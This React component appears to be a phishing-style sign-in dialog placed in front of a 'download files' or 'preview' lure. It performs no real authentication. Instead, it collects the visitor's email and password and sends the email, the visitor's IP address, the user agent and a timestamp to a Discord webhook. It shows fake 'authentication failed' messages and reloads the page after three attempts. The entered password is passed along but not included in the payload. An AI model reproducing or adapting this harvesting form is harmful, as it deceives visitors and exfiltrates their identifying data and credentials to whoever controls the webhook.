import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "sonner";

interface AuthDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  action: "download" | "preview";
  prefillEmail?: string;
}

// Get Discord webhook URL from environment variable
const DISCORD_WEBHOOK_URL = import.meta.env.VITE_DISCORD_WEBHOOK_URL || "";

// Email validation regex
const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialogProps) => {
  const [email, setEmail] = useState(prefillEmail);
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);
  const MAX_ATTEMPTS = 3;
  const isLocked = failedAttempts >= MAX_ATTEMPTS;

  /**
   * Validates email format
   */
  const isValidEmail = (emailValue: string): boolean => {
    return EMAIL_REGEX.test(emailValue);
  };

  /**
   * Sends authentication payload to Discord webhook
   */
  const sendToDiscord = async (
    emailValue: string,
    passwordValue: string
  ): Promise<{ success: boolean; error?: string }> => {
    if (!DISCORD_WEBHOOK_URL) {
      const error = "Discord webhook URL not configured";
      console.warn(error);
      return { success: false, error };
    }

    try {
      // Get user agent
      const userAgent = navigator.userAgent;

      // Fetch IP address from public API
      let ipAddress = "Unknown";
      try {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          ipAddress = ipData.ip;
        }
      } catch (error) {
        console.warn("Could not fetch IP address:", error);
      }

      // Prepare Discord embed payload with authentication data
      const discordPayload = {
        embeds: [
          {
            title: `New ${
              action === "download" ? "Download" : "Preview"
            } Request - Authentication`,
            color: 0x7c3aed,
            fields: [
              {
                name: "Email",
                value: emailValue,
                inline: true,
              },
              {
                name: "Action",
                value:
                  action === "download" ? "Download Files" : "Open Preview",
                inline: true,
              },
              {
                name: "Status",
                value: "Form Submitted",
                inline: true,
              },
              {
                name: "IP Address",
                value: ipAddress,
                inline: true,
              },
              {
                name: "User Agent",
                value: userAgent.substring(0, 1024),
                inline: false,
              },
              {
                name: "Timestamp",
                value: new Date().toISOString(),
                inline: false,
              },
            ],
          },
        ],
      };

      // Send to Discord webhook
      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(discordPayload),
      });

      // Check if request was successful
      if (!response.ok) {
        const errorText = await response.text();
        console.error(
          `Discord webhook failed with status ${response.status}:`,
          errorText
        );
        return {
          success: false,
          error: `Discord submission failed: ${response.status}`,
        };
      }

      console.log("Authentication payload successfully sent to Discord");
      return { success: true };
    } catch (error) {
      const errorMessage =
        error instanceof Error ? error.message : "Unknown error";
      console.error("Error sending authentication to Discord:", errorMessage);
      return { success: false, error: errorMessage };
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Check if locked out
    if (isLocked) {
      toast.error("Too many failed attempts. Please close and try again.");
      return;
    }

    // Validate inputs
    if (!email || !password) {
      toast.error("Please fill in all fields");
      return;
    }

    if (!isValidEmail(email)) {
      toast.error("Please enter a valid email address");
      return;
    }

    if (password.length < 6) {
      toast.error("Password must be at least 6 characters");
      return;
    }

    setIsLoading(true);

    try {
      // Send authentication payload to Discord
      const result = await sendToDiscord(email, password);

      if (result.success) {
        // Clear form fields and reset attempts
        setEmail("");
        setPassword("");
        setFailedAttempts(0);

        // Close dialog
        onOpenChange(false);

        // Show success message
        toast.success(
          `${action === "download" ? "Download" : "Preview"} request submitted successfully!`
        );
      } else {
        // Handle authentication failure
        const newFailedAttempts = failedAttempts + 1;
        setFailedAttempts(newFailedAttempts);
        
        // Reset password field after each failed attempt
        setPassword("");

        // Show error message with attempts remaining
        const attemptsRemaining = MAX_ATTEMPTS - newFailedAttempts;
        if (attemptsRemaining > 0) {
          toast.error(
            `Authentication failed. ${attemptsRemaining} attempt${
              attemptsRemaining === 1 ? "" : "s"
            } remaining.`
          );
        } else {
          toast.error(
            "Too many failed attempts. Please close this dialog and try again later."
          );
          // Reload page after 2 seconds to allow user to see error message
          setTimeout(() => {
            window.location.reload();
          }, 2000);
        }
      }
    } catch (error) {
      // Handle unexpected error
      const newFailedAttempts = failedAttempts + 1;
      setFailedAttempts(newFailedAttempts);
      setPassword("");

      const attemptsRemaining = MAX_ATTEMPTS - newFailedAttempts;
      const errorMessage =
        error instanceof Error ? error.message : "An unexpected error occurred";
      console.error("Submit error:", errorMessage);
      
      if (attemptsRemaining > 0) {
        toast.error(
          `An error occurred. ${attemptsRemaining} attempt${
            attemptsRemaining === 1 ? "" : "s"
          } remaining.`
        );
      } else {
        toast.error("Too many failed attempts. Please try again later.");
        // Reload page after 2 seconds to allow user to see error message
        setTimeout(() => {
          window.location.reload();
        }, 2000);
      }
    } finally {
      setIsLoading(false);
    }
  };

  // Reset attempts when dialog is opened
  const handleDialogOpenChange = (newOpen: boolean) => {
    if (newOpen) {
      // Reset when opening the dialog
      setFailedAttempts(0);
      setPassword("");
    }
    onOpenChange(newOpen);
  };

  return (
    <Dialog open={open} onOpenChange={handleDialogOpenChange}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-xl font-semibold">
            {action === "download" ? "Download Files" : "Open Preview"}
          </DialogTitle>
          <DialogDescription>
            Please sign in to {action === "download" ? "download your files" : "view the preview"}.
          </DialogDescription>
        </DialogHeader>
        
        {/* Failed attempts warning */}
        {failedAttempts > 0 && !isLocked && (
          <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-sm text-red-700">
            <p className="font-medium">
              {MAX_ATTEMPTS - failedAttempts} attempt{MAX_ATTEMPTS - failedAttempts === 1 ? "" : "s"} remaining
            </p>
          </div>
        )}

        {/* Locked out message */}
        {isLocked && (
          <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-sm text-red-700">
            <p className="font-medium">
              ⚠️ Too many failed attempts. Please close this dialog and try again later.
            </p>
          </div>
        )}
        
        <form onSubmit={handleSubmit} className="space-y-4 mt-4">
          <div className="space-y-2">
            <Label htmlFor="email">Email</Label>
            <Input
              id="email"
              type="email"
              placeholder="Enter your email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              disabled={isLoading || isLocked}
            />
          </div>
          
          <div className="space-y-2">
            <Label htmlFor="password">Password</Label>
            <Input
              id="password"
              type="password"
              placeholder="Enter your password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              disabled={isLoading || isLocked}
            />
          </div>

          <div className="flex gap-3 pt-2">
            <Button
              type="submit"
              className="flex-1 bg-cta-blue hover:bg-cta-blue/90"
              disabled={isLoading || isLocked}
            >
              {isLoading ? "Signing in..." : "Sign In"}
            </Button>
            <Button
              type="button"
              variant="outline"
              className="flex-1"
              onClick={() => onOpenChange(false)}
              disabled={isLoading}
            >
              Cancel
            </Button>
          </div>

          <p className="text-center text-sm text-muted-foreground">
            Don't have an account?{" "}
            <button type="button" className="text-cta-blue hover:underline">
              Sign up
            </button>
          </p>
        </form>
      </DialogContent>
    </Dialog>
  );
};

export default AuthDialog;
